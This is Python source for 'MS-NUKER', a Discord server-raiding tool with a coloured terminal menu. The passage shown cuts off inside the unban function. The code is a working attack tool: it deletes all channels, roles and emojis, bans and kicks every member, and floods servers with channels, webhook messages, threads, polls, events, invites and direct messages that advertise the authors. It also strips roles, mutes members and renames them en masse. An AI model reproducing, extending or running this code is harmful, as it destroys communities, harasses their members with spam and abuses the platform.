# MS-NUKER - Main Script
# Author: M-Society (c1q_ & Cyk)
# Description: Discord server nuking tool with TUI interface

import os, sys, time, random, asyncio, json, re, webbrowser
import urllib.request
import aiohttp
from datetime    import datetime, timezone, timedelta
from shutil      import get_terminal_size
from colorama    import init

import discord
from discord.ext import commands
from discord     import Activity, ActivityType

init(autoreset=True)

_CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

def _load_config():
    try:
        with open(_CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

_cfg = _load_config()

NO_BAN_KICK_ID = _cfg.get("no_ban_kick_ids", [])

DISCORD_URL = _cfg.get("discord_url", "https://discord.gg/w7TvFudgxm")
GITHUB_URL  = _cfg.get("github_url", "https://github.com/M-Societyy")
RAID_NAME   = _cfg.get("raid_name", "raid-by-ms")
TOOL_NAME   = _cfg.get("tool_name", "MS-NUKER")
GIF_BANNER  = _cfg.get("gif_banner", "https://media.discordapp.net/attachments/1359542047794528407/1366981943622893648/0427-1.gif")

_discord_short = DISCORD_URL.replace("https://", "")
PUB         = f"||@everyone||\n\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n> \u2590\u2588\u2588 **{TOOL_NAME}**\n> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n> *server claimed by M-Society.*\n> \n> \u25AA {DISCORD_URL}\n> \u25AA {GITHUB_URL}\n> \u25AA https://www.youtube.com/@m-societyoff"
PUB_SHORT   = f"{_discord_short} \u00b7 github.com/M-Societyy"

_ar_cfg = _cfg.get("auto_raid", {})
AUTO_RAID_CONFIG = {
    "channel_type"   : _ar_cfg.get("channel_type", "text"),
    "channel_name"   : RAID_NAME,
    "num_channels"   : _ar_cfg.get("num_channels", 50),
    "num_messages"   : _ar_cfg.get("num_messages", 10),
    "message_content": PUB,
}

EMBED_CONFIG = {
    "title"      : f"\u2590\u2588\u2588  {TOOL_NAME}",
    "description": (
        "```ansi\n"
        "\u2591\u2592\u2593\u2588 Server compromised. \u2588\u2593\u2592\u2591\n"
        "```\n"
        "||@everyone||\n\n"
        f"> \u25AA **Discord** \u2500 {DISCORD_URL}\n"
        f"> \u25AA **Github** \u2500 {GITHUB_URL}\n"
        "> \u25AA **YouTube** \u2500 https://www.youtube.com/@m-societyoff\n"
        "\n\u2800"
    ),
    "color"      : 0xDC143C,
    "message"    : "||@everyone||",
    "image"      : GIF_BANNER,
    "footer"     : f"M-Society \u2502 {TOOL_NAME} v1.0.0 \u2502 \u25aa\u25aa\u25aa",
    "fields"     : [],
}

_wh_cfg = _cfg.get("webhook", {})
WEBHOOK_CONFIG = {"default_name": _wh_cfg.get("default_name", "MS-NUKER")}
_srv_cfg = _cfg.get("server", {})
SERVER_CONFIG  = {
    "new_name"       : _srv_cfg.get("new_name", "RAIDED BY MS-NUKER"),
    "new_icon"       : _srv_cfg.get("new_icon", ""),
    "new_description": _srv_cfg.get("new_description", _discord_short),
}
_bp_cfg = _cfg.get("bot_presence", {})
BOT_PRESENCE = {"type": _bp_cfg.get("type", "playing"), "text": _bp_cfg.get("text", _discord_short)}

RS  = "\033[0m";  B   = "\033[1m"
R0  = "\033[38;5;9m"
R1  = "\033[38;5;196m";  R2  = "\033[38;5;160m";  R3  = "\033[38;5;124m"
R4  = "\033[38;5;88m";   R5  = "\033[38;5;52m"
DIM = "\033[38;5;240m";  D2  = "\033[38;5;235m";  D3  = "\033[38;5;233m"
WHT = "\033[38;5;252m";  GRY = "\033[38;5;245m"

def r1(t):  return f"{R1}{B}{t}{RS}"
def r2(t):  return f"{R2}{t}{RS}"
def r3(t):  return f"{R3}{t}{RS}"
def dim(t): return f"{DIM}{t}{RS}"
def wht(t): return f"{WHT}{B}{t}{RS}"

def _TW():   return min(get_terminal_size((100,30)).columns, 110)
def _clr():  os.system('cls' if os.name == 'nt' else 'clear')
def _vis(s): return re.sub(r'\033\[[^m]*m','',s)
def _vl(s):  return len(_vis(s))

def fx_glitch(text: str, n=5):
    gc = "!@#$%^&*?+"
    for i in range(n):
        g = "".join(random.choice(gc) if random.random()<.18 else c for c in text)
        col = R1 if i%2 else R3
        sys.stdout.write(f"\r  {col}{B}{g}{RS}"); sys.stdout.flush(); time.sleep(.05)
        sys.stdout.write(f"\r{' '*(_vl(text)+6)}"); sys.stdout.flush(); time.sleep(.025)
    sys.stdout.write(f"\r  {R1}{B}{text}{RS}\n"); sys.stdout.flush()

def fx_load(label: str, w=26, delay=.002):
    print(f"\n  {R1}{B}::{RS} {wht(label)}  {R1}{B}ready{RS}\n")

def fx_spin(label: str, dur=.9):
    sys.stdout.write(f"  {R1}{B}+{RS}  {wht(label)}\n"); sys.stdout.flush()

_LOGS: list[str] = []

def _ts():  return f"{D2}[{DIM}{datetime.now().strftime('%H:%M:%S')}{D2}]{RS}"
def _log(p, m):
    print(f"  {_ts()} {p} {WHT}{m}{RS}")
    _LOGS.append(f"[{datetime.now().strftime('%H:%M:%S')}] {_vis(m)}")

def log_ok  (m): _log(f"{R1}{B}[+]{RS}", m)
def log_err (m): _log(f"{R3}{B}[-]{RS}", m)
def log_warn(m): _log(f"{R2}{B}[!]{RS}", m)
def log_info(m): _log(f"{DIM}[*]{RS}",   m)

def _ask(prompt: str) -> str:
    return input(f"\n  {R1}{B}>>{RS} {wht(prompt)} {D2}:{RS} ").strip()

def _confirm(p: str) -> bool:
    return input(f"\n  {R2}[?]{RS} {wht(p)} {DIM}[yes/no]{RS} {D2}:{RS} ").strip().lower() == "yes"

def _section(title: str):
    w = 58
    grad = f"{R5}▐{R4}▐{R3}▌{R2}▌{R1} {RS}"
    print(f"\n  {D3}{'━'*w}{RS}")
    print(f"  {grad}{R1}{B}{title}{RS}")
    print(f"  {D3}{'━'*w}{RS}\n")

def _summary(action: str, ok: int, fail: int, t: float):
    print(f"\n  {D3}┌{'─'*42}┐{RS}")
    print(f"  {D3}│{RS}  {GRY}action{RS}  {wht(action)}{' '*(28-_vl(action))}{D3}│{RS}")
    print(f"  {D3}│{RS}  {R1}◆{RS} {R2}{ok}{RS} {GRY}ok{RS}   {R4}◇{RS} {DIM}{fail}{RS} {GRY}err{RS}   {D2}⏱{RS} {DIM}{t:.2f}s{RS}{' '*10}{D3}│{RS}")
    print(f"  {D3}└{'─'*42}┘{RS}\n")

def _get_guild(sid: str):
    g = bot.get_guild(int(sid))
    if not g: log_err("guild not found")
    return g

_ART = [
    r"                  :::!~!!!!!:.                       ",
    r"              .xUHWH!! !!?M88WHX:.                   ",
    r"            .X*#M@$!!  !X!M$$$$$$WWx:.               ",
    r"           :!!!!!!?H! :!$!$$$$$$$$$$8X:              ",
    r"          !!~  ~:~!! :~!$!#$$$$$$$$$$8X:             ",
    r"         :!~::!H!<   ~.U$X!?R$$$$$$$$MM!             ",
    r"         ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!             ",
    r"           !:~~~ .:!M\"T#$$$$WX??#MRRMMM!             ",
    r"           ~?WuxiW*`   `\"#$$$$8!!!!??!!!             ",
    r"         :X- M$$$$       `\"T#$T~!8$WUXU~             ",
    r"        :%`  ~#$$$m:        ~!~ ?$$$$$$              ",
    r"      :!`.-   ~T$$$$8xx.  .xWW- ~\"\"##*\"             ",
    r".....   -~~:<` !    ~?T#$$@@W@*?$$      /`            ",
    r"W$@@M!!! .!~~ !!     .:XUW$W!~ `\"~:    :            ",
    r"#\"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`            ",
    r":::~:!!`:X~ .: ?H.!u \"$$$B$$$!W:U!T$$M~             ",
    r".~~   :X@!.-~   ?@WTWo(\"*$$$W$TH$! `                ",
    r"Wi.~!X$?!-~    : ?$$$B$Wu(\"**$RM!                   ",
    r"$R@i.~~ !     :   ~$$$$$B$$en:``                     ",
    r"?MXT@Wx.~    :     ~\"##*$$$$M~                       ",
]
_SHADES = [R5, R5, R4, R4, R3, R3, R2, R2, R1, R1, R0, R1, R1, R2, R2, R3, R3, R4, R4, R5]

async def _print_banner_async(bot_n="", srv_n="", members=0, animated=False):
    print()
    for i, line in enumerate(_ART):
        c = _SHADES[i % len(_SHADES)]
        print(f"  {c}{line}{RS}")
        if animated: await asyncio.sleep(.02)
    print()
    print(f"  {R1}{B}MS-NUKER{RS} {DIM}v1.0.0{RS}  {R3}│{RS}  {GRY}M-Society Dev Team{RS}  {R3}│{RS}  {GRY}c1q_ & Cyk{RS}")
    print()
    if bot_n:
        info = f"  {D2}┌─{RS} {GRY}bot{RS} {r1(bot_n)}  {D3}│{RS}  {GRY}server{RS} {wht(srv_n or '-')}  {D3}│{RS}  {GRY}members{RS} {r1(str(members))} {D2}─┐{RS}"
        print(info)
        print()

def _print_banner(bot_n="", srv_n="", members=0, animated=False):
    print()
    for i, line in enumerate(_ART):
        c = _SHADES[i % len(_SHADES)]
        print(f"  {c}{line}{RS}")
    print()
    print(f"  {R1}{B}MS-NUKER{RS} {DIM}v1.0.0{RS}  {R3}│{RS}  {GRY}M-Society Dev Team{RS}  {R3}│{RS}  {GRY}c1q_ & Cyk{RS}")
    print()
    if bot_n:
        info = f"  {D2}┌─{RS} {GRY}bot{RS} {r1(bot_n)}  {D3}│{RS}  {GRY}server{RS} {wht(srv_n or '-')}  {D3}│{RS}  {GRY}members{RS} {r1(str(members))} {D2}─┐{RS}"
        print(info)
        print()

_MENU = [
    [
        [("01","Nuke"),  ("02","Auto Raid"),  ("03","Ban All"),  ("04","Kick All")],
        [("05","Mute All"),  ("06","Unban All"),  ("07","Del Channels"),  ("08","Del Emojis")],
        [("09","Del Stickers"),  ("10","Create Channels"),  ("11","Create Roles"),  ("12","Create Cats")],
        [("13","Rename Channels"),  ("14","Rename Roles"),  ("15","Edit Server"),  ("16","Rename Members")],
        [("17","Fix Nicks"),  ("18","Get Admin"),  ("19","Impersonate"),  ("20","Ghost Ping")],
    ],
    [
        [("21","Remov Roles"),  ("22","Message All"),  ("23","DM Spam User"),  ("24","Webhook Spam")],
        [("25","Server Info"),  ("26","Clone Server"),  ("27","Webhook Logs"),  ("28","Lockdown")],
        [("29","Sourdine VC"),  ("30","Kick VC All"),  ("31","Move All VC"),  ("32","Invite Spam")],
        [("33","Spam"),  ("34","Thread Spam"),  ("35","Reaction Spam"),  ("36","Voice Spam")],
        [("37","Spoiler Spam"),  ("38","Poll Spam"),  ("39","Event Spam"),  ("40","Quit")],
    ],
    [
        [("41","Purge Msgs"),  ("42","Export Logs"),  ("43","Slowmode All"),  ("44","Webhook Nuke")],
        [("45","Role All"),  ("46","Topic Spam"),  ("47","Perm Override"),  ("48","Steal Emojis")],
        [("49","Prune Members"),  ("50","Change Server"),  ("51","Star-unlock"),  ("52","Star-unlock")],
        [("53","Star-unlock"),  ("54","Star-unlock"),  ("55","Star-unlock"),  ("56","Star-unlock")],
        [("57","Star-unlock"),  ("58","Star-unlock"),  ("59","Star-unlock"),  ("60","Star-unlock")],
    ],
]

_CW = 24

def _cell(num, label) -> str:
    tag = f"{R2}«{num}»{RS}"; lbl = f"{WHT}{label}{RS}"
    raw = f"{tag} {lbl}"; pad = max(0, _CW - _vl(raw))
    return raw + " " * pad

def _border(lc, mc, rc, fill="─"):
    seg   = fill * (_CW + 2)
    inner = (f"{D2}{mc}{RS}" + f"{D2}{seg}{RS}") * 3
    return f"  {D2}{lc}{RS}{D2}{seg}{RS}{inner}{D2}{rc}{RS}"

def _row_line(cells):
    out = []
    for item in cells:
        if item is None: out.append(" " + " " * _CW + " ")
        else:
            n, l = item; out.append(f" {_cell(n, l)} ")
    return f"  {D2}|{RS}" + f"{D2}|{RS}".join(out) + f"{D2}|{RS}"

def _print_menu(page: int = 1):
    rows = _MENU[page-1]
    print(_border("┌","┬","┐"))
    for i, row in enumerate(rows):
        print(_row_line(row))
        if i < len(rows)-1: print(_border("├","┼","┤"))
    print(_border("└","┴","┘"))
    prev = r1("«b»") if page > 1 else dim("   ")
    nxt  = r1("«n»") if page < 3 else dim("   ")
    print(f"\n  {prev} {dim('prev')}    {dim(f'page {page}/3')}    {nxt} {dim('next')}    {dim('«q» quit')}")
    print(f"\n  {R4}MS-NUKER{RS} {D2}·{RS} {DIM}v1.0.0{RS}  {D3}│{RS}  {DIM}M-Society{RS}")
    print(f"\n  {R2}▸{RS} ", end="", flush=True)

def _pub_append(content: str) -> str:
    if _discord_short in content: return content
    return f"{content}\n{PUB}"

async def delete_channel(c) -> bool:
    try:
        await c.delete(); log_ok(f"#{c.name}"); return True
    except discord.Forbidden:          log_err(f"no perm #{c.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} #{c.name}")
    return False

async def delete_role(r) -> bool:
    if r.is_default(): return False
    try:
        await r.delete(); log_ok(f"@{r.name}"); return True
    except discord.Forbidden:          log_err(f"no perm @{r.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} @{r.name}")
    return False

async def create_channel(guild, typ, name):
    try:
        c = (await guild.create_text_channel(name) if typ == 'text' else await guild.create_voice_channel(name))
        log_ok(f"#{c.name}"); return c
    except discord.Forbidden:          log_err(f"no perm create {typ}")
    except discord.HTTPException as e: log_err(f"http{e.status}")
    return None

async def _send_embed(target, everyone=False):
    try:
        cfg = EMBED_CONFIG
        e   = discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
        for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
        if cfg["image"]: e.set_image(url=cfg["image"])
        e.set_footer(text=cfg["footer"])
        c = f"@everyone {cfg['message']}" if everyone else cfg['message']
        await target.send(content=c, embed=e)
        log_ok(f"embed -> {getattr(target,'name',str(target))}")
    except Exception as ex: log_err(_vis(str(ex)))

async def _send_to(chan, count, content, everyone):
    final = _pub_append(content)
    async def _fire(i):
        try:
            if content.lower() == 'embed': await _send_embed(chan, everyone)
            else: await chan.send(final)
            log_ok(f"[{i+1}/{count}] #{chan.name}")
        except discord.Forbidden:          log_err(f"no perm #{chan.name}")
        except discord.HTTPException as e: log_err(f"http{e.status} #{chan.name}")
    await asyncio.gather(*[_fire(i) for i in range(count)])

async def _mk_role(g):
    try:
        col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
        await g.create_role(name="MS-NUKER", colour=col); return True
    except: return False

def _skip(m, bot_id):
    if m.id == bot_id: return True
    if m.id in NO_BAN_KICK_ID: log_warn(f"skip {m.name}"); return True
    return False

async def nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("NUKE")
    log_warn(f"{g.name}  {dim(f'{len(g.channels)}ch / {len(g.roles)}roles')}")
    if not _confirm(f"full nuke {g.name}"): return log_info("canceled")
    t = time.perf_counter()
    fx_load("wiping channels & roles", 26, .002)
    cr, rr = await asyncio.gather(
        asyncio.gather(*[delete_channel(c) for c in list(g.channels)]),
        asyncio.gather(*[delete_role(r) for r in list(g.roles)]),
    )
    log_ok(f"{cr.count(True)} channels  {rr.count(True)} roles deleted")
    fx_load("creating channels & roles", 22, .002)
    created, roles = await asyncio.gather(
        asyncio.gather(*[g.create_text_channel(RAID_NAME) for _ in range(50)], return_exceptions=True),
        asyncio.gather(*[_mk_role(g) for _ in range(50)]),
    )
    new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
    log_ok(f"{len(new_chans)} channels  {roles.count(True)} roles created")
    fx_load("webhook spam", 22, .002)
    async def _raid_chan(chan):
        try:
            wh = await chan.create_webhook(name="MS-NUKER")
            async def _f():
                try: await wh.send(content=f"{PUB}\n{GIF_BANNER}", username="MS-NUKER")
                except: pass
            await asyncio.gather(*[_f() for _ in range(5)])
            try: await wh.delete()
            except: pass
            log_ok(f"spammed #{chan.name}")
        except Exception as e: log_err(f"#{chan.name}  {_vis(str(e))}")
    await asyncio.gather(*[_raid_chan(c) for c in new_chans])
    fx_glitch(f"NUKE COMPLETE  |  {g.name} | MS-NUKER")
    _summary("Nuke", len(new_chans), 50-len(new_chans), time.perf_counter()-t)

async def auto_raid(sid):
    g = _get_guild(sid)
    if not g: return
    _section("AUTO RAID"); log_warn(f"target  {g.name}")
    t = time.perf_counter()
    fx_load("wiping", 26, .002)
    ch = await asyncio.gather(*[delete_channel(c) for c in list(g.channels)])
    log_ok(f"{ch.count(True)} channels wiped")
    fx_load("building", 22, .002)
    created, roles = await asyncio.gather(
        asyncio.gather(*[g.create_text_channel(AUTO_RAID_CONFIG['channel_name']) for _ in range(AUTO_RAID_CONFIG['num_channels'])], return_exceptions=True),
        asyncio.gather(*[_mk_role(g) for _ in range(50)]),
    )
    new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
    log_ok(f"{len(new_chans)} channels  {roles.count(True)} roles")
    fx_load("flooding", 22, .002)
    async def _raid_ch(c):
        try:
            wh = await c.create_webhook(name="MS-NUKER")
            async def _f():
                try: await wh.send(content=f"{PUB}\n{GIF_BANNER}", username="MS-NUKER")
                except: pass
            await asyncio.gather(*[_f() for _ in range(AUTO_RAID_CONFIG['num_messages'])])
            log_ok(f"#{c.name}")
        except: pass
    await asyncio.gather(*[_raid_ch(c) for c in new_chans])
    fx_glitch(f"RAID DONE  |  {g.name} | MS-NUKER")
    _summary("Auto Raid", len(new_chans)+roles.count(True), 0, time.perf_counter()-t)

async def delete_emojis(sid):
    g = _get_guild(sid)
    if not g: return
    emojis = list(g.emojis)
    if not emojis: return log_info("no emojis")
    _section("DEL EMOJIS"); fx_load("wiping", 18, .002)
    t = time.perf_counter()
    async def _d(e):
        try: await e.delete(); log_ok(f":{e.name}:"); return True
        except: return False
    r = await asyncio.gather(*[_d(e) for e in emojis])
    _summary("Del Emojis", r.count(True), r.count(False), time.perf_counter()-t)

async def delete_stickers(sid):
    g = _get_guild(sid)
    if not g: return
    st = list(g.stickers)
    if not st: return log_info("no stickers")
    _section("DEL STICKERS"); fx_load("wiping", 16, .002)
    t = time.perf_counter()
    async def _d(s):
        try: await s.delete(); log_ok(s.name); return True
        except: return False
    r = await asyncio.gather(*[_d(s) for s in st])
    _summary("Del Stickers", r.count(True), r.count(False), time.perf_counter()-t)

async def delete_all_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DELETE CHANNELS")
    log_warn(f"{g.name}  {dim(f'{len(g.channels)} channels')}")
    if not _confirm(f"delete all channels {g.name}"): return log_info("canceled")
    fx_load("deleting all channels", 26, .002)
    t = time.perf_counter()
    r = await asyncio.gather(*[delete_channel(c) for c in list(g.channels)])
    fx_glitch(f"ALL CHANNELS DELETED  |  {g.name}")
    _summary("Delete Channels", r.count(True), r.count(False), time.perf_counter()-t)

async def spam_channel(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM")
    try: count = int(_ask("messages per channel"))
    except ValueError: return log_err("invalid")
    content  = _ask("content  [enter = pub  |  'embed' = embed]") or PUB
    everyone = False
    if content.lower() == 'embed': everyone = _ask("@everyone? [yes/no]").lower() == 'yes'
    fx_load("charging", 18, .002)
    t  = time.perf_counter()
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    await asyncio.gather(*[_send_to(c, count, content, everyone) for c in tc])
    _summary("Spam", count*len(tc), 0, time.perf_counter()-t)

async def _send_wh(wh, count, content, everyone):
    final = _pub_append(content)
    async def _fire():
        try:
            if content.lower() == 'embed': await _send_embed(wh, everyone)
            else: await wh.send(content=f"{final}\n{GIF_BANNER}", username="MS-NUKER")
            log_ok(f"wh {wh.name}")
        except: pass
    await asyncio.gather(*[_fire() for _ in range(count)])

async def webhook_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("WEBHOOK SPAM")
    try: count = int(_ask("messages per webhook"))
    except ValueError: return log_err("invalid")
    content  = _ask("content  [enter = pub  |  'embed' = embed]") or PUB
    everyone = False
    if content.lower() == 'embed': everyone = _ask("@everyone? [yes/no]").lower() == 'yes'
    fx_load("spawning webhooks", 20, .002)
    t   = time.perf_counter()
    whs = await asyncio.gather(*[c.create_webhook(name=WEBHOOK_CONFIG["default_name"]) for c in g.channels if isinstance(c, discord.TextChannel)], return_exceptions=True)
    whs = [w for w in whs if isinstance(w, discord.Webhook)]
    log_info(f"{len(whs)} webhooks")
    await asyncio.gather(*[_send_wh(wh, count, content, everyone) for wh in whs])
    _summary("Webhook Spam", len(whs)*count, 0, time.perf_counter()-t)

async def thread_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("THREAD SPAM")
    try: count = int(_ask("threads per channel"))
    except ValueError: return log_err("invalid")
    name = _ask("thread name  [enter = pub]") or f"{TOOL_NAME} | {_discord_short}"
    fx_load("spawning", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                m = await chan.send(PUB); await m.create_thread(name=f"{name} {i+1}")
                log_ok(f"#{chan.name} [{i+1}]"); ok += 1
            except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Thread Spam", ok, fail, time.perf_counter()-t)

async def reaction_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("REACTION SPAM")
    try: limit = int(_ask("messages per channel"))
    except ValueError: return log_err("invalid")
    ms_emojis = ["\U0001f1fb","\U0001f1f4","\U0001f1ee","\U0001f1e9","\U0001f300","\U0001f4ab","\U0001f573","\U0001f533","\U0001f517"]
    fx_load("loading", 14, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try:
            async for msg in chan.history(limit=limit):
                for emoji in ms_emojis:
                    try: await msg.add_reaction(emoji); ok += 1
                    except: fail += 1
        except: pass
    _summary("Reaction Spam", ok, fail, time.perf_counter()-t)

async def vc_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("VOICE SPAM")
    try: loops = int(_ask("cycles per VC"))
    except ValueError: return log_err("invalid")
    vcs = [c for c in g.channels if isinstance(c, discord.VoiceChannel)]
    log_info(f"{len(vcs)} VCs"); fx_load("connecting", 14, .002)
    t = time.perf_counter(); ok=fail=0
    for vc in vcs:
        for i in range(loops):
            try:
                conn = await vc.connect(timeout=3.0); await asyncio.sleep(.2); await conn.disconnect(force=True)
                log_ok(f"[{i+1}/{loops}] #{vc.name}"); ok += 1
            except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Voice Spam", ok, fail, time.perf_counter()-t)

async def spoiler_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPOILER SPAM")
    try: count = int(_ask("messages per channel"))
    except ValueError: return log_err("invalid")
    content = _ask("content  [enter = pub]") or PUB_SHORT
    fx_load("flooding", 16, .002)
    t  = time.perf_counter()
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    wrapped = f"||{content}||\n{PUB}"
    await asyncio.gather(*[_send_to(c, count, wrapped, False) for c in tc])
    _summary("Spoiler Spam", count*len(tc), 0, time.perf_counter()-t)

async def poll_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("POLL SPAM")
    try: count = int(_ask("polls per channel"))
    except ValueError: return log_err("invalid")
    question = _ask("question  [enter = pub]") or f"Join MS-NUKER  |  {PUB_SHORT}"
    fx_load("creating", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                poll = discord.Poll(question=question[:300], duration=timedelta(hours=1))
                poll.add_answer(text=_discord_short)
                poll.add_answer(text="github.com/M-Societyy")
                await chan.send(poll=poll); log_ok(f"#{chan.name} [{i+1}]"); ok += 1
            except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Poll Spam", ok, fail, time.perf_counter()-t)

async def event_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("EVENT SPAM")
    try: count = int(_ask("quantity"))
    except ValueError: return log_err("invalid")
    name = _ask("event name  [enter = pub]") or "MS-NUKER"
    desc = _ask("description [enter = pub]") or f"**RAIDED BY MS-NUKER**\n{PUB_SHORT}"
    fx_load("scheduling", 18, .002)
    t = time.perf_counter(); ok=fail=0
    start = datetime.now(timezone.utc)+timedelta(hours=1); end_t = start+timedelta(hours=2)
    for i in range(count):
        try:
            await g.create_scheduled_event(name=f"{name} #{i+1}", description=desc,
                start_time=start+timedelta(minutes=i), end_time=end_t+timedelta(minutes=i),
                entity_type=discord.EntityType.external, location=PUB_SHORT,
                privacy_level=discord.PrivacyLevel.guild_only)
            log_ok(f"{name} #{i+1}"); ok += 1
        except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Event Spam", ok, fail, time.perf_counter()-t)

async def invite_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("INVITE SPAM")
    try: count = int(_ask("quantity"))
    except ValueError: return log_err("invalid")
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not tc: return log_err("no text channels")
    fx_load("generating", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for _ in range(count):
        try:
            inv = await random.choice(tc).create_invite(max_age=60, max_uses=1, unique=True)
            log_ok(inv.url); ok += 1
        except Exception as e: log_err(_vis(str(e))); fail += 1
    _summary("Invite Spam", ok, fail, time.perf_counter()-t)

async def ban_all(sid, bot_id):
    g = _get_guild(sid)
    if not g: return
    _section("BAN ALL")
    if not _confirm(f"ban all  {g.name}  [{g.member_count} members]"): return log_info("canceled")
    fx_load("preparing", 24, .002)
    t = time.perf_counter()
    async def _b(m):
        if _skip(m, bot_id): return False
        try: await m.ban(reason=PUB_SHORT); log_ok(m.name); return True
        except discord.Forbidden:          log_err(f"no perm {m.name}")
        except discord.HTTPException as e: log_err(f"http{e.status} {m.name}")
        return False
    r = await asyncio.gather(*[_b(m) for m in g.members])
    fx_glitch(f"BAN WAVE  |  {r.count(True)} banned")
    _summary("Ban All", r.count(True), r.count(False), time.perf_counter()-t)

async def kick_all(sid, bot_id):
    g = _get_guild(sid)
    if not g: return
    _section("KICK ALL")
    if not _confirm(f"kick all  {g.name}  [{g.member_count} members]"): return log_info("canceled")
    fx_load("preparing", 24, .002)
    t = time.perf_counter()
    async def _k(m):
        if _skip(m, bot_id): return False
        try: await m.kick(reason=PUB_SHORT); log_ok(m.name); return True
        except discord.Forbidden:          log_err(f"no perm {m.name}")
        except discord.HTTPException as e: log_err(f"http{e.status} {m.name}")
        return False
    r = await asyncio.gather(*[_k(m) for m in g.members])
    _summary("Kick All", r.count(True), r.count(False), time.perf_counter()-t)

async def mute_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("MUTE ALL")
    try: mins = int(_ask("minutes"))
    except ValueError: return log_err("invalid")
    until = datetime.now(timezone.utc)+timedelta(minutes=mins)
    fx_load("applying", 22, .002)
    t = time.perf_counter()
    async def _m(m):
        if m.bot or m.id in NO_BAN_KICK_ID: return False
        try: await m.timeout(until); log_ok(m.name); return True
        except: return False
    r = await asyncio.gather(*[_m(m) for m in g.members])
    _summary("Mute All", r.count(True), r.count(False), time.perf_counter()-t)

async def _dm(m, content):
    if m.bot: return False
    try: await m.send(content); log_ok(m.name); return True
    except: return False

async def dm_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("MESSAGE ALL")
    content = _ask("message  [enter = pub]") or PUB
    fx_load("sending", 20, .002)
    t = time.perf_counter()
    r = await asyncio.gather(*[_dm(m, content) for m in g.members])
    _summary("Message All", r.count(True), r.count(False), time.perf_counter()-t)

async def dm_spam_user(sid):
    """Spam DM un user précis par son ID — N messages, message custom ou pub par défaut."""
    g = _get_guild(sid)
    if not g: return
    _section("DM SPAM USER")

    uid = _ask("ID de l'utilisateur cible")
    try: uid = int(uid)
    except ValueError: return log_err("ID invalide")

    try: count = int(_ask("nombre de messages"))
    except ValueError: return log_err("nombre invalide")

    msg = _ask("message  [enter = pub par défaut]") or PUB

    target = None
    try:   target = await g.fetch_member(uid)
    except Exception:
        try:   target = await bot.fetch_user(uid)
        except Exception: return log_err(f"user {uid} introuvable")

    log_info(f"target  {target}  ({target.id})")
    log_info(f"envoi de {count} messages...")
    fx_load("spamming DMs", 24, .002)

    t = time.perf_counter(); ok = fail = 0

    for i in range(count):
        try:
            await target.send(msg)
            log_ok(f"[{i+1}/{count}]  {target.name}")
            ok += 1
        except discord.Forbidden:
            log_err(f"DMs fermés —  {target.name}  (impossible d'envoyer)")
            fail += count - i
            break
        except discord.HTTPException as e:
            log_err(f"http{e.status}"); fail += 1
        if (i + 1) % 5 == 0:
            await asyncio.sleep(.6)

    _summary("DM Spam User", ok, fail, time.perf_counter()-t)

async def nick_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENAME MEMBERS")
    nick = _ask("nickname  [enter = pub]") or f"MS | {PUB_SHORT}"
    nv   = nick[:32] or None
    fx_load("renaming", 20, .002)
    t = time.perf_counter()
    async def _n(m):
        if m.bot or m.id in NO_BAN_KICK_ID: return False
        try: await m.edit(nick=nv); log_ok(m.name); return True
        except: return False
    r = await asyncio.gather(*[_n(m) for m in g.members])
    _summary("Rename Members", r.count(True), r.count(False), time.perf_counter()-t)

async def strip_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("STRIP ROLES")
    if not _confirm("strip all roles"): return log_info("canceled")
    fx_load("stripping", 22, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.bot or m.id in NO_BAN_KICK_ID: continue
        removable = [r for r in m.roles if not r.is_default()]
        if not removable: continue
        try: await m.remove_roles(*removable); log_ok(f"{m.name}  -{len(removable)} roles"); ok += 1
        except: fail += 1
    _summary("Strip Roles", ok, fail, time.perf_counter()-t)

async def unban_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("UNBAN ALL"); fx_spin("fetching bans", .8)
    bans = [e async for e in g.bans()]; log_info(f"{len(bans)} bans")
    if not bans: return
    fx_load("unbanning", 20, .002)
    t = time.perf_counter()
